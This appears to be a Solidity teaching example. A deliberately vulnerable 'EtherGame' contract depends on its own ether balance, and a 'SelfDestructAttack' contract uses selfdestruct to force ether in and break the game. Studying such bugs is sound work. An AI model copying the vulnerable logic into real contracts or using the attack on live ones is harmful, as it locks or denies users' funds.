// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

contract EtherGame {
    error EtherGame__OnlyOneEther();
    error EtherGame__GameOver();
    error EtherGame__NotWinner();
    error EtherGame__TransferFailed();

    uint256 public s_targetAmount = 7 ether;
    address public s_winner;

    function deposit() public payable {
        if (msg.value != 1 ether) revert EtherGame__OnlyOneEther();

        uint256 balance = address(this).balance;
        if (balance > s_targetAmount) revert EtherGame__GameOver();

        if (balance == s_targetAmount) s_winner = msg.sender;
    }

    function claimReward() public {
        if (msg.sender != s_winner) revert EtherGame__NotWinner();

        (bool sent,) = msg.sender.call{value: address(this).balance}("");
        if (!sent) revert EtherGame__TransferFailed();
    }
}

contract SelfDestructAttack {
    EtherGame immutable i_etherGame;

    constructor(EtherGame _etherGame) {
        i_etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        address payable addr = payable(address(i_etherGame));
        selfdestruct(addr);
    }
}
